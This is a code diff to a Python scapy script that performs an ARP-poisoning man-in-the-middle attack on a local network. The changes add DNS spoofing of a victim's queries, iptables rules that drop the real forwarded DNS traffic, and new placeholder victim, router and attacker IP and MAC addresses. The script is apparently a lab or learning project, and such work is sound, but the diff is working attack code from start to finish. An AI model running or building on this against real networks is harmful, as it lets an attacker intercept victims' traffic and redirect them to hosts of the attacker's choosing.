@@ -1,5 +1,6 @@
 from scapy.all import *
 from Forward import *
+from DNS import *
 import threading
 
 def forge_arp_response(rcv_ip, rcv_mac, res_ip, res_mac):
@@ -34,18 +35,20 @@ def stop_arp_mittm(threads):
 	threads[1].stop()
 	
 def only_dns(pkt):
-    	if pkt.haslayer(UDP):
-        	if pkt.haslayer(DNS):
-            		print(pkt.summary())
+	if pkt.haslayer(UDP):
+		if pkt.haslayer(DNS):
+			print(pkt.summary())
+			return True
+	return False
 
 	
 # placeholder
 victim_ip = "192.168.1.101"
-victim_mac = "00:0c:29:5c:dd:75"
+victim_mac = "00:0c:29:20:af:e4"
 router_ip = "192.168.1.1"
-router_mac = "00:0c:29:9a:aa:86"
-self_ip = "192.168.1.100"
-self_mac = "00:0c:29:c0:d0:fc"
+router_mac = "00:0c:29:94:84:aa"
+self_ip = "192.168.1.102"
+self_mac = "00:0c:29:97:ee:06"
 
 enable_kernel_forwarding("eth0")
 
@@ -54,6 +57,11 @@ threads = start_arp_mitm(victim_ip, victim_mac, router_ip, router_mac , self_mac
 def print_fn(pkt):
 	print(pkt[Ether].src)
 	print(pkt.summary())
+	spoof_dns(pkt, victim_ip, router_ip, "eth0")
+	
+# Temp: make this function later	
+run("iptables -I FORWARD -p udp --dport 53 -j DROP")
+run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
 	
 intercept_pkts(victim_ip, self_mac, "eth0", only_dns, print_fn)
 
